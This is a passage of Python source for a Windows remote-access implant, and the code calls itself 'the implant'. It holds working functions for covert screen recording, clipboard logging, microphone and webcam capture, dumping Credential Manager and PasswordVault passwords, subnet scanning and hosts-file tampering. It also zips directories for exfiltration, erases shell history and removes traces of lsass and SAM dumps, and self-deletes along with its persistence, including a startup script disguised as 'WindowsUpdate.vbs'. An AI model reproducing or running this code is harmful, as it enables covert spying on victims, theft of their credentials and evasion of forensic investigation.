  int f(); int g(); int h(); int i();
  int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
  int j(); int k(); int l(); int m(); int n(); int o(); int p(); int q(); int r(); int s();
}}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {{ int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev); }}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {{ int f(); int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint); }}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject {{}}
public class Audio {{
  public static void SetVol(float v) {{
    var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator; IMMDevice dev = null;
    enumerator.GetDefaultAudioEndpoint(0, 1, out dev); IAudioEndpointVolume epv = null; var epvid = typeof(IAudioEndpointVolume).GUID;
    dev.Activate(ref epvid, 1, 0, out epv); epv.SetMasterVolumeLevelScalar(v, System.Guid.Empty);
  }}
}}
"@
Add-Type -TypeDefinition $code
[Audio]::SetVol({vol/100.0})
'''
        run_ps(ps, timeout=15)
        return f"[+] Volume set to {int(vol)}%"
    except Exception as e:
        return f"[-] Volume error: {e}"

def get_battery() -> str:
    """Get battery status (percentage and charging state)."""
    ps = "Get-WmiObject Win32_Battery -EA SilentlyContinue | Select-Object EstimatedChargeRemaining, BatteryStatus | ConvertTo-Json"
    out = run_ps(ps, timeout=15)
    if "EstimatedChargeRemaining" not in out:
        return "[-] Battery info not available (e.g., desktop PC)."
    try:
        data = json.loads(out)
        if isinstance(data, list):
            data = data[0]
        charge = data.get("EstimatedChargeRemaining", "N/A")
        status = data.get("BatteryStatus", 1)
        charging = "YES" if status in [2, 6, 7, 8, 9] else "NO"
        return f"[+] Battery: {charge}% (Charging: {charging})"
    except:
        return "[-] Error checking battery."

# ===================== RECORD SCREEN =====================

def record_screen(seconds: str) -> str:
    """Record the screen for N seconds at 10 fps, return ZIP path."""
    try:
        sec = int(seconds)
    except:
        return "[-] Invalid seconds"

    rdir = os.path.join(TEMP, f"rec_{datetime.datetime.now().strftime('%H%M%S')}")
    os.makedirs(rdir, exist_ok=True)

    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$t = {sec}
$fps = 10
$frames = $t * $fps
$delay = 1000 / $fps
for ($i=1; $i -le $frames; $i++) {{
    $bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
    $bmp.Save("{rdir}\\frame_$i.jpg", [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $bmp.Dispose()
    Start-Sleep -Milliseconds $delay
}}
'''
    run_ps(ps, timeout=sec + 20)
    zpath = os.path.join(TEMP, "record_screen.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in os.listdir(rdir):
                zf.write(os.path.join(rdir, f), f)
        safe_remove(rdir)
        return zpath
    except Exception as e:
        safe_remove(rdir)
        return f"[-] ZIP error: {e}"

# ===================== CLIPBOARD MONITOR =====================

_clipmon_active = False
_clipmon_file = os.path.join(TEMP, "clipmon.txt")

def clipmon_control(action: str) -> str:
    """Control clipboard monitor: start, stop, dump, clear."""
    global _clipmon_active
    if action == "start":
        if _clipmon_active:
            return "[*] Already active"
        ps_script = r'''$f="''' + _clipmon_file + r'''"
$lc=""
while($true){
    Start-Sleep -Seconds 2
    $c = Get-Clipboard -EA SilentlyContinue
    if ($c -ne $null -and $c -ne $lc) {
        $lc = $c
        "`r`n--- $(Get-Date -F 'HH:mm:ss') ---`r`n$c" | Out-File $f -Append -Encoding utf8
    }
}'''
        ps_path = os.path.join(TEMP, "cm.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _clipmon_active = True
            return "[+] Clipboard monitor started"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | 
            Where-Object {$_.CommandLine -like '*cm.ps1*'} | 
            ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
        _clipmon_active = False
        safe_remove(os.path.join(TEMP, "cm.ps1"))
        return "[+] Clipboard monitor stopped"
    elif action == "dump":
        if os.path.exists(_clipmon_file):
            try:
                with open(_clipmon_file, 'r', encoding='utf-8', errors='replace') as f:
                    return f"[+] Clipboard History:\n{f.read()}"
            except Exception as e:
                return f"[-] Error: {e}"
        return "[-] No data"
    elif action == "clear":
        safe_remove(_clipmon_file)
        return "[+] History cleared"
    return "[-] Usage: clip_monitor start|stop|dump|clear"

# ===================== LIST WIFI =====================

def list_wifi() -> str:
    """List nearby WiFi networks."""
    out = run_cmd("netsh wlan show networks mode=bssid", timeout=15)
    return f"[+] Nearby WiFi Networks:\n{out}"

# ===================== CLEANUP =====================

def cleanup() -> str:
    """Delete all temporary files created by the implant."""
    r = []
    for pat in ["si_*", "br_*", "ex_*", "sc.png", "sysinfo.tar", "browsers.zip", "exfil.tar",
                "steal_*.zip", "kl.txt", "kl.ps1", "sam.save", "system.save", "security.save",
                "record_screen.zip", "rec_*", "cm.ps1", "clipmon.txt",
                "mic_rec.wav", "webcam.jpg", "lsass.dmp", "_gc.ps1",
                "dir_*.zip", "sl.ps1", "scrloop.zip", "scrloop",
                "tts_*.vbs", "dl_*", "port_scan_*"]:
        for f in glob.glob(os.path.join(TEMP, pat)):
            safe_remove(f)
            r.append(f"  Removed: {os.path.basename(f)}")
    # Clear PS history
    psh = os.path.join(APPDATA, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
    if os.path.exists(psh):
        try:
            open(psh, 'w').close()
            r.append("  PS history cleared")
        except:
            pass
    # Clear cmd history
    run_cmd('doskey /reinstall 2>nul')
    return "[+] Cleanup:\n" + "\n".join(r) if r else "[+] Nothing to clean"

# ===================== LS =====================

def list_directory(path: str = ".") -> str:
    """List directory contents with details."""
    try:
        path = os.path.abspath(path)
        if not os.path.isdir(path):
            return f"[-] Not a directory: {path}"
        r = [f"Directory: {path}\n"]
        dirs, files = [], []
        for e in sorted(os.listdir(path)):
            full = os.path.join(path, e)
            try:
                st = os.stat(full)
                mt = datetime.datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')
                if os.path.isdir(full):
                    dirs.append(f"  [DIR]  {mt}            {e}")
                else:
                    files.append(f"  [FILE] {mt} {st.st_size:>10} {e}")
            except:
                files.append(f"  [???]                      {e}")
        r.extend(dirs)
        r.extend(files)
        r.append(f"\n  {len(dirs)} dirs, {len(files)} files")
        return "\n".join(r)
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== STATUS =====================

def get_system_status() -> str:
    """Return quick system status."""
    try:
        user = getpass.getuser()
        host = socket.gethostname()
        admin = "YES" if is_admin() else "NO"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "N/A"
        pid = os.getpid()
        up = get_uptime_str()
        return f"User: {user}\nHost: {host}\nIP: {ip}\nAdmin: {admin}\nPID: {pid}\nDir: {os.getcwd()}\nUptime: {up}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ALERT =====================

def show_alert(msg: str) -> str:
    """Display a popup message box."""
    env = os.environ.copy()
    env['_ALERT_MSG'] = msg
    ps = 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($env:_ALERT_MSG,"System","OK","Information") | Out-Null'
    try:
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', ps],
                       timeout=15, capture_output=True, creationflags=0x08000000, env=env)
        return "[+] Alert displayed"
    except:
        return "[-] Error displaying alert"

# ===================== RECORD MIC =====================

def record_mic(seconds: str) -> str:
    """Record microphone for N seconds, return WAV path."""
    try:
        sec = int(seconds)
        if sec <= 0 or sec > 3600:
            return "[-] Invalid seconds (1-3600)"
    except:
        return "[-] Usage: record_mic <seconds>"
    out_path = os.path.join(TEMP, "mic_rec.wav")
    safe_remove(out_path)
    ps = f'''Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MCI {{
    [DllImport("winmm.dll", CharSet=CharSet.Auto)]
    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int retLen, IntPtr callback);
}}
"@
[MCI]::mciSendString("open new Type waveaudio Alias mic", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("set mic bitspersample 16 samplespersec 44100 channels 1 alignment 2", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("record mic", $null, 0, [IntPtr]::Zero) | Out-Null
Start-Sleep -Seconds {sec}
[MCI]::mciSendString("stop mic", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("save mic `"{out_path}`"", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("close mic", $null, 0, [IntPtr]::Zero) | Out-Null
'''
    run_ps(ps, timeout=sec + 20)
    if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
        return out_path
    return "[-] Recording failed (microphone available?)"

# ===================== WEBCAM SNAP =====================

def webcam_snap() -> str:
    """Take a picture from the webcam."""
    out_path = os.path.join(TEMP, "webcam.jpg")
    safe_remove(out_path)
    ps = f'''$ErrorActionPreference = 'SilentlyContinue'
try {{
    $deviceManager = New-Object -ComObject WIA.DeviceManager
    $device = $deviceManager.DeviceInfos | Where-Object {{$_.Type -eq 2}} | Select-Object -First 1
    if ($device) {{
        $cam = $device.Connect()
        $item = $cam.Items | Select-Object -First 1
        $img = $item.Transfer("{{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}}")
        $img.SaveFile("{out_path}")
    }}
}} catch {{}}
'''
    run_ps(ps, timeout=20)
    if not os.path.exists(out_path) or os.path.getsize(out_path) < 100:
        ffmpeg = shutil.which('ffmpeg')
        if ffmpeg:
            run_cmd(f'"{ffmpeg}" -f dshow -i video="" -frames:v 1 -y "{out_path}" 2>nul', timeout=15)
    if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
        return out_path
    return "[-] Webcam unavailable or no image"

# ===================== LOCK SCREEN =====================

def lock_screen() -> str:
    """Lock the workstation."""
    try:
        ctypes.windll.user32.LockWorkStation()
        return "[+] Screen locked"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== CHANGE WALLPAPER =====================

def change_wallpaper(img_path: str) -> str:
    """Change desktop wallpaper to a local image."""
    img_path = img_path.strip('"').strip("'")
    if not os.path.exists(img_path):
        return f"[-] Does not exist: {img_path}"
    try:
        SPI_SETDESKWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, img_path,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        return f"[+] Wallpaper changed: {img_path}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== APP CONTROL =====================

def kill_app(name: str) -> str:
    """Kill a process by name."""
    name = name.strip()
    if not name.lower().endswith('.exe'):
        name += '.exe'
    r = run_cmd(f'taskkill /IM "{name}" /F')
    return f"[+] {r}" if 'killed' in r.lower() or 'terminado' in r.lower() or 'finaliz' in r.lower() else r

def open_app(name: str) -> str:
    """Launch an application in the background."""
    try:
        subprocess.Popen(name, shell=True, creationflags=0x08000000)
        return f"[+] Launched: {name}"
    except Exception as e:
        return f"[-] Error: {e}"

def hide_app(name: str) -> str:
    """Hide windows of a process."""
    name = name.strip()
    ps = f'''Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W32 {{
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")]public static extern IntPtr FindWindow(string c, string t);
}}
"@
$procs = Get-Process | Where-Object {{$_.MainWindowTitle -like '*{name}*' -or $_.Name -like '*{name}*'}} -EA SilentlyContinue
foreach($p in $procs){{[W32]::ShowWindow($p.MainWindowHandle,0)|Out-Null}}
$procs.Count
'''
    count = run_ps(ps, timeout=10).strip()
    return f"[+] {count} window(s) of '{name}' hidden" if count.isdigit() else f"[?] {count}"

def show_app(name: str) -> str:
    """Restore hidden windows of a process."""
    name = name.strip()
    ps = f'''Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W32b {{
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h, int n);
}}
"@
$procs = Get-Process | Where-Object {{$_.Name -like '*{name}*'}} -EA SilentlyContinue
foreach($p in $procs){{[W32b]::ShowWindow($p.MainWindowHandle,9)|Out-Null}}
$procs.Count
'''
    count = run_ps(ps, timeout=10).strip()
    return f"[+] {count} window(s) of '{name}' shown" if count.isdigit() else f"[?] {count}"

# ===================== AUTODESTROY =====================

def autodestroy() -> str:
    """
    Completely remove the implant: delete persistence, clean temp files,
    and schedule self‑deletion via an external PowerShell script.
    """
    results = []
    # 1. Remove persistence
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] HKCU Registry removed")
    except:
        results.append("[-] HKCU Registry: not found")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                              r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] HKLM Registry removed")
    except:
        pass

    # 2. User scheduled task
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}" /f 2>nul')
    results.append("[+] Scheduled task removed")

    # 3. If admin, also system task
    if is_admin():
        run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}_System" /f 2>nul')
        results.append("[+] System task removed")

    # 4. Startup VBS
    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    safe_remove(vbs)
    results.append("[+] Startup VBS removed")

    # 5. Cleanup temp files
    cleanup()
    results.append("[+] Temporary files cleaned")

    # 6. Create PS script to delete the implant files after parent exits
    script_to_delete = PERSIST_SCRIPT
    this_script = os.path.abspath(__file__)
    pid = os.getpid()

    killer_ps = os.path.join(TEMP, "_gc.ps1")
    ps_content = f'''$pid_target = {pid}
$scripts = @("{script_to_delete}", "{this_script}")
Start-Sleep -Seconds 3
try {{ Wait-Process -Id $pid_target -Timeout 10 -EA SilentlyContinue }} catch {{}}
foreach($s in $scripts) {{ if(Test-Path $s){{ Remove-Item $s -Force -EA SilentlyContinue }} }}
Remove-Item "{killer_ps}" -Force -EA SilentlyContinue
'''
    try:
        with open(killer_ps, 'w') as f:
            f.write(ps_content)
        subprocess.Popen(
            ['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', killer_ps],
            creationflags=0x08000000
        )
        results.append("[+] Self‑destruction scheduled")
    except Exception as e:
        results.append(f"[-] Killer script: {e}")

    results.append("[!] Closing shell... The implant will be deleted in seconds.")
    return "\n".join(results)

# ===================== SEARCH FILES =====================

def search_files(pattern: str, root: str = "C:\\") -> str:
    """Search files by name pattern."""
    pattern = pattern.strip().strip('"\'')
    if not pattern:
        return "[-] Usage: search <pattern>"
    r = run_cmd(f'dir /s /b "{root}\\*{pattern}*" 2>nul', timeout=30)
    lines = [l.strip() for l in r.split('\n') if l.strip() and '\\' in l and not l.startswith('[-]')]
    if not lines:
        return f"[-] No results for: {pattern}"
    out = f"[+] {len(lines)} result(s) for '{pattern}':\n"
    out += '\n'.join(lines[:100])
    if len(lines) > 100:
        out += f"\n[...and {len(lines)-100} more...]"
    return out

# ===================== CREDENTIAL VAULT =====================

def dump_credvault() -> str:
    """Dump Windows Credential Manager and DPAPI files."""
    results = ["=== Windows Credential Manager ==="]
    results.append(run_cmd('cmdkey /list'))
    results.append("\n=== DPAPI Files ===")
    for cred_dir in [os.path.join(APPDATA, "Microsoft", "Credentials"),
                     os.path.join(LOCAL_APPDATA, "Microsoft", "Credentials")]:
        if os.path.exists(cred_dir):
            try:
                for f in os.listdir(cred_dir):
                    results.append(f"  {cred_dir}\\{f}")
            except:
                pass
    ps = r'''$ErrorActionPreference='SilentlyContinue'
try {
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $v = New-Object Windows.Security.Credentials.PasswordVault
    $all = $v.RetrieveAll()
    if ($all.Count -gt 0) {
        $all | ForEach-Object { try{$_.RetrievePassword()}catch{}
            "  Res=$($_.Resource) | User=$($_.UserName) | Pass=$($_.Password)" }
    } else { "  (vault empty)" }
} catch { "  WinRT PasswordVault unavailable" }'''
    results.append("\n=== Windows PasswordVault ===")
    results.append(run_ps(ps, timeout=10))
    return "\n".join(results)

# ===================== NET SCAN =====================

def net_scan(subnet: str = "") -> str:
    """Ping sweep of a /24 subnet."""
    subnet = subnet.strip()
    if '/' in subnet:
        subnet = '.'.join(subnet.split('/')[0].split('.')[:3])
    elif subnet.count('.') == 3:
        subnet = '.'.join(subnet.split('.')[:3])
    if not subnet:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            subnet = '.'.join(ip.split('.')[:3])
        except:
            return "[-] Could not determine local subnet"
    ps = f'''$sub = "{subnet}"
$jobs = 1..254 | ForEach-Object {{
    $ip = "$sub.$_"
    Start-Job -ScriptBlock {{
        param($h)
        if (Test-Connection -ComputerName $h -Count 1 -Quiet -TimeoutSeconds 1) {{
            try {{ $n=[System.Net.Dns]::GetHostEntry($h).HostName; "$h  [$n]" }} catch {{ "$h" }}
        }}
    }} -ArgumentList $ip
}}
$jobs | Wait-Job -Timeout 30 | Out-Null
$r = $jobs | Receive-Job | Sort-Object
$jobs | Remove-Job -Force | Out-Null
$r'''
    out = run_ps(ps, timeout=90)
    lines = [l.strip() for l in out.split('\n') if l.strip() and '.' in l and not l.startswith('[')]
    if not lines:
        return f"[-] No live hosts in {subnet}.0/24"
    return f"[+] Live hosts in {subnet}.0/24 ({len(lines)}):\n" + "\n".join(lines)

# ===================== HOSTS EDIT =====================

def hosts_edit(domain: str, ip: str) -> str:
    """Add an entry to the hosts file."""
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, 'r') as f:
            content = f.read()
        if domain in content:
            return f"[~] '{domain}' already exists in hosts"
        with open(hosts_path, 'a') as f:
            f.write(f"\n{ip}\t{domain}")
        return f"[+] hosts: {ip} → {domain}"
    except PermissionError:
        return "[-] Permission denied (requires admin)"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== GET ENV =====================

def getenv(var: str = "") -> str:
    """Show environment variables."""
    if var:
        val = os.environ.get(var)
        return f"[+] {var}={val}" if val is not None else f"[-] '{var}' not found"
    return "[+] Environment Variables:\n" + "\n".join(sorted(f"  {k}={v}" for k, v in os.environ.items()))

# ===================== DOWNLOAD DIR =====================

def download_dir(path: str) -> str:
    """Compress a directory and return ZIP path."""
    path = path.strip().strip('"\'')
    if not os.path.isdir(path):
        return f"[-] Not a directory: {path}"
    dname = os.path.basename(path.rstrip('/\\')) or "dir"
    zpath = os.path.join(TEMP, f"dir_{dname}_{datetime.datetime.now().strftime('%H%M%S')}.zip")
    total = 0
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(path):
                for file in files:
                    full = os.path.join(root, file)
                    try:
                        fsize = os.path.getsize(full)
                        if fsize > 100 * 1024 * 1024 or total > 500 * 1024 * 1024:
                            continue
                        zf.write(full, os.path.relpath(full, path))
                        total += fsize
                    except:
                        continue
        return zpath
    except Exception as e:
        return f"[-] ZIP error: {e}"

# ===================== CLIP SET =====================

def clip_set(text: str) -> str:
    """Set clipboard content."""
    try:
        env = os.environ.copy()
        env['_CLIP_TEXT'] = text
        subprocess.run(['powershell', '-NoProfile', '-Non
